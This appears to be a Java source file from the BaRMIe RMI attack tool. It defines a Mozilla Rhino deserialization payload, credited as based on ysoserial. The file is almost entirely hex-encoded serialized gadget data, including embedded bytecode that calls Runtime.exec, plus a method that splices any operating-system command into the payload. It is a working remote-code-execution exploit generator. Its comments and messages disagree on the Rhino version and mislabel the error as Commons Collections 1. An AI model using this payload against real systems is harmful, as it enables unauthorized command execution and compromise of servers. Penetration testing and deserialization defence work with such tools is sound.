package nb.barmie.modes.attack.deser.payloads;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import nb.barmie.exceptions.BaRMIeDeserPayloadGenerationException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;

/***********************************************************
 * Deserialization payload for Mozilla Rhino 1.7r2.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class RhinoPayload3 extends DeserPayload {
	/*******************
	 * Properties
	 ******************/
	//Payload data chunks
	private final String _header_chunk = "7372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B70787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC402000070787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B70787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD223902000070787000000000737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E0007707872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B707870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A65707870000000007704000000007871007E001078737200226F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654572726F72B5EA2521BE49CE7D02000070787200296F72672E6D6F7A696C6C612E6A6176617363726970742E496453637269707461626C654F626A6563748cbd7cf4d8a944a103000070787200276F72672E6D6F7A696C6C612E6A6176617363726970742E53637269707461626C654F626A6563742745afa870ac78ba030004490005636F756E744C00106173736F63696174656456616C75657374000F4C6A6176612F7574696C2F4D61703B4C0011706172656E7453636F70654F626A6563747400234C6F72672F6D6F7A696C6C612F6A6176617363726970742F53637269707461626C653B4C000F70726F746F747970654F626A65637471007E0015707870000000027070737200276F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654A6176614F626A6563749F91A59E35C431E10300024C0006706172656E7471007E00154C000970726F746F7479706571007E0015707870737200236F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654F626A656374A7F0F22AFF97BA0C020000707871007E001200000037737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647078703F4000000000000C7708000000100000000474000D4C4942524152595F53434F504571007E001A7400084974657261746F72737200336F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654974657261746F722453746F70497465726174696F6E227D07BEDDA89DBF020000707871007E0019000000007071007E001A7371007E0019000000007071007E001A707704000000007877040000000C78770400000000787704000000007874000A436C6173734361636865737200216F72672E6D6F7A696C6C612E6A6176617363726970742E436C617373436163686584F4C43496DC1F290200025A001063616368696E674973456E61626C656449001467656E657261746564436C61737353657269616C7078700000000000740000737200266F72672E6D6F7A696C6C612E6A6176617363726970742E4E617469766547656E657261746F7216D762746EC522C90200065A0009666972737454696D6549000A6C696E654E756D6265725A00066C6F636B65644C000866756E6374696F6E7400274C6F72672F6D6F7A696C6C612F6A6176617363726970742F4E617469766546756E6374696F6E3B4C000A6C696E65536F7572636571007E00054C000A7361766564537461746571007E0001707871007E001200000000707070770400000000787704000000057800000000000070707078707077040000005F7372002C6F72672E6D6F7A696C6C612E6A6176617363726970742E53637269707461626C654F626A65637424536C6F74AB79E83BE385789D02000453000A6174747269627574657349000B696E6465784F72486173684C00046E616D6571007E00054C000576616C756571007E0001707870000000000000740000737200276F72672E6D6F7A696C6C612E6A6176617363726970742E496446756E6374696F6E4F626A656374B5FFD1C66BA0FED502000649000561726974794900086D6574686F6449645A001475736543616C6C4173436F6E7374727563746F724C000C66756E6374696F6E4E616D6571007E00054C0006696463616C6C7400274C6F72672F6D6F7A696C6C612F6A6176617363726970742F496446756E6374696F6E43616C6C3B4C000374616771007E000170787200236F72672E6D6F7A696C6C612E6A6176617363726970742E4261736546756E6374696F6E49B5DD1BB05C2AE302000249001B70726F746F7479706550726F7065727479417474726962757465734C001170726F746F7479706550726F706572747971007E0001707871007E00120000000070707371007E002E0000000070707077040000000078770400000000780000000070770400000000787704000000007800000000700000000000000000007070707371007E00290000000000007400007371007E002C00000000707070770400000000787704000000007800000000700000000000000000007070707371007E00290000000000007400007371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000047071007E001A71007E002177040000000B7371007E0029000000337A8B7400046E616D6571007E00357371007E0029000038EB00077400076D6573736167657400007371007E00290000D425C62774000866696C654E616D6571007E003C7371007E00290000EC61B05D74000A6C696E654E756D626572737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C756570787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000070787000000000787704000000037800000001000000010171007E003571007E003771007E00357371007E002900021EB5489E7400096465636F64655552497371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000010071007E0045737200236F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665476C6F62616C546211EF26C230CA020000707870740006476C6F62616C7371007E002900022E10C5FF7400126465636F6465555249436F6D706F6E656E747371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000020071007E004B71007E004871007E00497371007E0029000259E44B76740009656E636F64655552497371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000030071007E004E71007E004871007E00497371007E00290002C89B7627740012656E636F6465555249436F6D706F6E656E747371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000040071007E005171007E004871007E00497371007E00290002B2DC80817400066573636170657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000050071007E005471007E004871007E00497371007E00290002002FB09C7400046576616C7371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000060071007E005771007E004871007E00497371007E00290002DC367E79740008697346696E6974657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000070071007E005A71007E004871007E00497371007E0029000205FD1B7174000569734E614E7371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000080071007E005D71007E004871007E00497371007E0029000231161EB87400096973584D4C4E616D657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001000000090071007E006071007E004871007E00497371007E00290002C428CF6974000A7061727365466C6F61747371007E002C000000007071007E001A7077040000000078770400000000780000000470000000010000000A0071007E006371007E004871007E00497371007E0029000246CC243C7400087061727365496E747371007E002C000000007071007E001A7077040000000078770400000000780000000470000000020000000B0071007E006671007E004871007E00497371007E00290002E7B3785A740008756E6573636170657371007E002C000000007071007E001A7077040000000078770400000000780000000470000000010000000C0071007E006971007E004871007E00497371007E00290002CDE4CAB5740006756E6576616C7371007E002C000000007071007E001A7077040000000078770400000000780000000470000000010000000D0071007E006C71007E004871007E00497371007E00290002000130DB7400034E614E737200106A6176612E6C616E672E446F75626C6580B3C24A296BFB0402000144000576616C7565707871007E00427FF80000000000007371007E002900020E2CCE48740008496E66696E6974797371007E00707FF00000000000007371007E00290002C21F6150740009756E646566696E6564737200206F72672E6D6F7A696C6C612E6A6176617363726970742E556E646566696E65647F9D9ECFF72ACBBF0200007078707371007E00290002E859127274000F436F6E76657273696F6E4572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E007A7877040000000078000000010000000E0171007E007A71007E004871007E00497371007E002900029FC652AC7400094576616C4572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E007F7877040000000078000000010000000E0171007E007F71007E004871007E00497371007E002900020932C2EB74000A52616E67654572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E00847877040000000078000000010000000E0171007E008471007E004871007E00497371007E002900025198459D74000E5265666572656E63654572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E00897877040000000078000000010000000E0171007E008971007E004871007E00497371007E00290002605053C574000B53796E7461784572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E008E7877040000000078000000010000000E0171007E008E71007E004871007E00497371007E0029000294F7E6CE740009547970654572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E00937877040000000078000000010000000E0171007E009371007E004871007E00497371007E00290002F016881C7400085552494572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E00987877040000000078000000010000000E0171007E009871007E004871007E00497371007E002900029B10F92B74000D496E7465726E616C4572726F727371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E009D7877040000000078000000010000000E0171007E009D71007E004871007E00497371007E00290002DD2FBC2D74000D4A617661457863657074696F6E7371007E002C000000007071007E001A707704000000007877040000000078000000077371007E0011000000017071007E001A71007E00377704000000057371007E0029000000337A8B71007E003971007E00A27877040000000078000000010000000E0171007E00A271007E004871007E00497371007E0029000203C9823974000541727261797371007E002C000000117071007E001A707704000000177371007E002900020031DD2A7400046A6F696E7371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFFB0071007E00AA737200226F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665417272617965BE3F5055DB7C6A0200035A000964656E73654F6E6C794A00066C656E6774685B000564656E73657400135B4C6A6176612F6C616E672F4F626A6563743B707871007E0012000000007071007E001A71007E00217704000000007877040000001578010000000000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C0200007078700000000A737200206F72672E6D6F7A696C6C612E6A6176617363726970742E556E69717565546167C40A4C7517C9E69502000149000574616749647078700000000171007E00B271007E00B271007E00B271007E00B271007E00B271007E00B271007E00B271007E00B271007E00B271007E00A77371007E00290002418E52E2740007726576657273657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFFA0071007E00B471007E00AE71007E00A77371007E002900020035F59E740004736F72747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF90071007E00B771007E00AE71007E00A77371007E002900020034AF1A740004707573687371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF80071007E00BA71007E00AE71007E00A77371007E002900020001B251740003706F707371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF70071007E00BD71007E00AE71007E00A77371007E0029000206856C8274000573686966747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF60071007E00C071007E00AE71007E00A77371007E00290002EF739589740007756E73686966747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF50071007E00C371007E00AE71007E00A77371007E00290002CA9A467C74000673706C6963657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF40071007E00C671007E00AE71007E00A77371007E00290002AF3F7714740006636F6E6361747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF30071007E00C971007E00AE71007E00A77371007E0029000206873D92740005736C6963657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF20071007E00CC71007E00AE71007E00A77371007E0029000273D44649740007696E6465784F667371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF10071007E00CF71007E00AE71007E00A77371007E00290002E42256D374000B6C617374496E6465784F667371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF00071007E00D271007E00AE71007E00A77371007E0029000205C6731B74000565766572797371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFEF0071007E00D571007E00AE71007E00A77371007E00290002B408CB7874000666696C7465727371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFEE0071007E00D871007E00AE71007E00A77371007E00290002D78CD66A740007666F72456163687371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFED0071007E00DB71007E00AE71007E00A77371007E002900020001A55C7400036D61707371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFEC0071007E00DE71007E00AE71007E00A77371007E002900020035F4F4740004736F6D657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFEB0071007E00E171007E00AE71007E00A778770400000000780000000771007E00AE00000001000000010171007E00A771007E00AE71007E00A77371007E00290002943A4C31740006537472696E677371007E002C000000127071007E001A7077040000002F7371007E00290002C4FE4C2D74000C66726F6D43686172436F64657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFFF0071007E00E7737200236F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665537472696E670CC57334977D230F0200014C0006737472696E6771007E0005707871007E0012000000007071007E001A71007E0021770400000000787704000000247871007E003C71007E00E47371007E00290002AED71E297400066368617241747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFFB0071007E00EC71007E00EA71007E00E47371007E0029000217AC15F674000A63686172436F646541747371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFFA0071007E00EF71007E00EA71007E00E47371007E0029000273D4464971007E00CF7371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF90071007E00CF71007E00EA71007E00E47371007E00290002E42256D371007E00D27371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF80071007E00D271007E00EA71007E00E47371007E0029000206891B1A74000573706C69747371007E002C000000007071007E001A707704000000007877040000000078000000047000000003FFFFFFF70071007E00F671007E00EA71007E00E47371007E002900021F9F6E51740009737562737472696E677371007E002C000000007071007E001A707704000000007877040000000078000000047000000003FFFFFFF60071007E00F971007E00EA71007E00E47371007E00290002BC31DD9674000B746F4C6F776572436173657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFF50071007E00FC71007E00EA71007E00E47371007E00290002E82F52B774000B746F5570706572436173657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFF40071007E00FF71007E00EA71007E00E47371007E00290002CADC57F17400067375627374727371007E002C000000007071007E001A707704000000007877040000000078000000047000000003FFFFFFF30071007E010271007E00EA71007E00E47371007E00290002AF3F771471007E00C97371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFF20071007E00C971007E00EA71007E00E47371007E0029000206873D9271007E00CC7371007E002C000000007071007E001A707704000000007877040000000078000000047000000003FFFFFFF10071007E00CC71007E00EA71007E00E47371007E002900020F5DAD41740010657175616C7349676E6F7265436173657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFE20071007E010971007E00EA71007E00E47371007E00290002062DD9C57400056D617463687371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFE10071007E010C71007E00EA71007E00E47371007E00290002C9FA65A87400067365617263687371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFE00071007E010F71007E00EA71007E00E47371007E00290002413CB2B47400077265706C6163657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFDF0071007E011271007E00EA71007E00E47371007E002900023E27CD2B74000D6C6F63616C65436F6D706172657371007E002C000000007071007E001A707704000000007877040000000078000000047000000002FFFFFFDE0071007E011571007E00EA71007E00E47371007E00290002A8AECC9C740011746F4C6F63616C654C6F776572436173657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFDD0071007E011871007E00EA71007E00E478770400000000780000000771007E00EA00000001000000010171007E00E471007E00EA71007E00E47371007E0029000267140408740007426F6F6C65616E7371007E002C000000007071007E001A70770400000000787704000000007800000007737200246F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665426F6F6C65616ECC6A9303539DE71B0200015A000C626F6F6C65616E56616C7565707871007E0012000000007071007E001A71007E002177040000000078770400000004780000000001000000010171007E011B71007E011E71007E011B7371007E002900028BBDC7697400064E756D6265727371007E002C000000057071007E001A7077040000000B7371007E00290007000130DB71007E006F71007E00717371007E00290007EB1E29AE740011504F5349544956455F494E46494E4954597371007E00707FF00000000000007371007E0029000734E07AF27400114E454741544956455F494E46494E4954597371007E0070FFF00000000000007371007E00290007CEDD22967400094D41585F56414C55457371007E00707FEFFFFFFFFFFFFF7371007E00290007FCE839047400094D494E5F56414C55457371007E00700000000000000001787704000000007800000007737200236F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654E756D62657230A28B6F31D79DA502000144000B646F75626C6556616C7565707871007E0012000000007071007E001A71007E00217704000000007877040000000878000000000000000000000001000000010171007E012071007E013071007E01207371007E00290002002063CE740004446174657371007E002C000000037071007E001A707704000000057371007E002900020001AAD67400036E6F777371007E002C000000007071007E001A707704000000007877040000000078000000047000000000FFFFFFFD0071007E0135737200216F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665446174658CB60C521ACEF48A02000144000464617465707871007E0012000000007071007E001A71007E00217704000000007877040000002D787FF800000000000071007E01327371007E0029000206581AB374000570617273657371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFFE0071007E013A71007E013871007E01327371007E00290002000149847400035554437371007E002C000000007071007E001A707704000000007877040000000078000000047000000001FFFFFFFF0071007E013D71007E013871007E013278770400000000780000000771007E013800000001000000010171007E013271007E013871007E01327371007E0029000200247B287400044D617468737200216F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654D61746885561B50925CC9CF020000707871007E0012000000007071007E001A71007E00217704000000007877040000001B787371007E00290002002924E6740004576974687371007E002C000000007071007E001A70770400000000787704000000007800000007737200216F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976655769746800000000000000010200024C0006706172656E7471007E00154C000970726F746F7479706571007E001570787071007E001A71007E002100000000000000010171007E014471007E014771007E01447371007E00290002001FEE7E74000443616C6C7371007E002C000000007071007E001A70770400000000787704000000007800000007737200216F72672E6D6F7A696C6C612E6A6176617363726970742E4E617469766543616C6C98500D2B813FD2CA0200024C000866756E6374696F6E71007E00275B000C6F726967696E616C4172677371007E00AD707871007E0012000000007071007E001A71007E00217704000000007877040000000178707000000001000000010171007E014971007E014C71007E01497371007E00290002934ABCEB7400065363726970747371007E002C000000007071007E001A737200236F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665536372697074A1B2F37EC354AD9C0200014C000673637269707474001F4C6F72672F6D6F7A696C6C612F6A6176617363726970742F5363726970743B707871007E002E000000007071007E001A71007E0021770400000000787704000000047800000004707077040000000078770400000000780000000771007E015200000001000000010171007E014E71007E015271007E014E7371007E002900024A566C8E71007E001E7371007E002C000000007071007E001A70770400000000787704000000007800000007737200256F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654974657261746F72C6968956626DC69F0200014C000E6F626A6563744974657261746F7271007E0001707871007E0012000000007071007E001A71007E002177040000000078770400000003787000000002000000010171007E001E71007E015671007E001E7371007E0029000240BC18DB74000D53746F70497465726174696F6E71007E0020737200326F72672E6D6F7A696C6C612E6A6176617363726970742E53637269707461626C654F626A65637424476574746572536C6F74BBFDA92373201D6C0200024C000667657474657271007E00014C000673657474657271007E0001707871007E0029000291AC8D09740006526567457870737200276F72672E6D6F7A696C6C612E6A6176617363726970742E4C617A696C794C6F6164656443746F7200000000000000010200065A00067365616C656449000573746174654C0009636C6173734E616D6571007E00054C0010696E697469616C697A656456616C756571007E00014C000C70726F70657274794E616D6571007E00054C000573636F70657400294C6F72672F6D6F7A696C6C612F6A6176617363726970742F53637269707461626C654F626A6563743B707870000000000074002A6F72672E6D6F7A696C6C612E6A6176617363726970742E7265676578702E4E61746976655265674578707071007E015B71007E001A70707371007E01590002309BB90D7400085061636B616765737371007E015C000000000074002B6F72672E6D6F7A696C6C612E6A6176617363726970742E4E61746976654A617661546F705061636B6167657071007E016171007E001A70707371007E015900020031AA227400046A6176617371007E015C000000000071007E01637071007E016571007E001A70707371007E0159000206039A967400056A617661787371007E015C000000000071007E01637071007E016871007E001A70707371007E015900020001AEE47400036F72677371007E015C000000000071007E01637071007E016B71007E001A70707371007E0159000200018181740003636F6D7371007E015C000000000071007E01637071007E016E71007E001A70707371007E01590002000187B67400036564757371007E015C000000000071007E01637071007E017171007E001A70707371007E015900020001A99D7400036E65747371007E015C000000000071007E01637071007E017471007E001A70707371007E0159000274434FC2740008676574436C6173737371007E015C000000000071007E01637071007E017771007E001A70707371007E015900026C71EEAD74000B4A617661416461707465727371007E015C00000000007400226F72672E6D6F7A696C6C612E6A6176617363726970742E4A617661416461707465727071007E017A71007E001A70707371007E0159000256774B7474000C4A617661496D706F727465727371007E015C00000000007400276F72672E6D6F7A696C6C612E6A6176617363726970742E496D706F72746572546F704C6576656C7071007E017E71007E001A70707371007E01590002DCB5CA5774000C436F6E74696E756174696F6E7371007E015C00000000007400296F72672E6D6F7A696C6C612E6A6176617363726970742E4E6174697665436F6E74696E756174696F6E7071007E018271007E001A70707371007E01590002000153F7740003584D4C7371007E015C00000000007400296F72672E6D6F7A696C6C612E6A6176617363726970742E786D6C696D706C2E584D4C4C6962496D706C7071007E018671007E001A70707371007E01590002B6DCA535740007584D4C4C6973747371007E015C000000000071007E01887071007E018A71007E001A70707371007E01590002C215753B7400094E616D6573706163657371007E015C000000000071007E01887071007E018D71007E001A70707371007E01590002049A5E7C740005514E616D657371007E015C000000000071007E01887071007E019071007E001A70707877040000000078707701007372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00054C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B70787000000000FFFFFFFF757200035B5B424BFD19156767DB3702000070787000000002757200025B42ACF317F8060854E0020000707870";
	private final String _mid_chunk = "cafebabe0000003100380a00030022070036070025070026010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010005284c3b29560100014101000141010001410100014101000141070027010006284c413b29560100014101000141010001410100014101000141010001410c000a000b07002801000141010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c6501000141010001410100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01";
	private final String _footer_chunk = "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b00340100014101000141002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003700000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0037000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003700000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c0000001b000300020000000fa70003014cb8002f1231b6003557b1000000000002002000000002002100110000000a000100020023001000097571007e019900000113cafebabe00000031001b0a00030015070017070018070019010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010001410c000a000b07001a01000241410100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501000141002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000141707701007874000f6a6176612e6c616e672e436c617373787704000000017371007e0159000000337a8b71007e003971007e0078737200206f72672e6d6f7a696c6c612e6a6176617363726970742e4d656d626572426f78583e1be606e304b503000070787077020101740005656e7465727672001e6f72672e6d6f7a696c6c612e6a6176617363726970742e436f6e7465787400000000000000000000007078707702000078707371007e0159000038eb000771007e003b71007e0078737200276f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654a6176614d6574686f64d0414efe72fe69000200024c000c66756e6374696f6e4e616d6571007e00055b00076d6574686f64737400235b4c6f72672f6d6f7a696c6c612f6a6176617363726970742f4d656d626572426f783b707871007e002e000000007070707704000000007877040000000078000000047071007e003b757200235b4c6f72672e6d6f7a696c6c612e6a6176617363726970742e4d656d626572426f783b3226214ee6215239020000707870000000017371007e019f7702010174000e6e65775472616e73666f726d65727671007e01927702000078707877040000000078";
	
	/*******************
	 * Set payload properties
	 ******************/
	public RhinoPayload3() {
		super();
		this.setName("Rhino3");
		this.setDescription("Mozilla Rhino 1.7r3");
		this.setRemediationAdvice("[Mozilla Rhino] " + this.REMEDIATION_NO_FIX);
		this.setAffectedJars(new String[] {
			"js.jar"
		});
	}
	
	/*******************
	 * Generate payload bytes for the given OS command, correcting references
	 * by the given amount.
	 * 
	 * @param cmd The operating system command to execute.
	 * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).
	 * @return An array of bytes making up the deserialization payload.
	 ******************/
	public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException {
		ByteArrayOutputStream out;
		
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output
			out = new ByteArrayOutputStream();
			out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
			
			//Add the middle chunk
			out.write(this.intToByteArray(765 + cmd.length()));
			out.write(this.hexStrToByteArray(this._mid_chunk));
			
			//Add the command string to the output
			out.write(this.stringToUtf8ByteArray(cmd));
			
			//Fix references in the footer bytes and add them to the output
			out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
		} catch(IOException ioe) {
			throw new BaRMIeDeserPayloadGenerationException("Failed to build Commons Collections 1 deserialization payload.", ioe);
		}
		
		//Return the payload bytes
		return out.toByteArray();
	}
}

